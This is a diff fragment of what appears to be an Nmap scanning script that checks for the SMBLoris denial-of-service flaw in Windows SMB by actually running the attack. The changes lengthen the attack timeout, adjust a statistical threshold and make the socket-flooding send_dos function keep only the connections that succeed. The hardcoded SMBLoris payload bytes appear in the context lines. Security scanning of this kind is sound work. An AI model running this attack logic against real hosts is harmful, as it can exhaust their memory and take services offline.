@@ -88,9 +88,9 @@ hostrule = function(host)
 end
 
 local host_down = false
-local TIMEOUT = 300 -- number of seconds to timeout the attack
+local TIMEOUT = 1000 -- number of seconds to timeout the attack
 local skts = {} -- prevent garbage collection
-local CRITICAL_VALUE_99 = 2.58
+local CRITICAL_VALUE_99 = 3.3
 local SMBLORIS_PAYLOAD = '\x00\x01\xff\xff'
 
 --- calculates the arithmetic mean for time by averaging the values
@@ -181,11 +181,19 @@ local function send_dos(host, port, src_port)
 
   stdnse.debug1("Trying to send from %s", src_port)
 
+  -- tries to catch 2 exceptions
+  -- 1) user does not have sufficient permissions to bind to the port
+  -- 2) system already has a service listening on the port
   try(socket:bind("0.0.0.0", src_port))
-  socket:connect(host, port)
+
+  local status, err = socket:connect(host, port)
   socket:send(SMBLORIS_PAYLOAD)
-  if not oldsocket then
-    table.insert(skts, socket)
+  if status then
+    if not oldsocket then
+      table.insert(skts, socket)
+    else
+      skts[src_port] = socket
+    end
   end
 
 end
@@ -237,7 +245,6 @@ All modern versions of Windows, at least from Windows 2000 through Windows 10, a
       break
     end
   end
-
   if host_down then
     vuln.state = vulns.STATE.VULN
   end
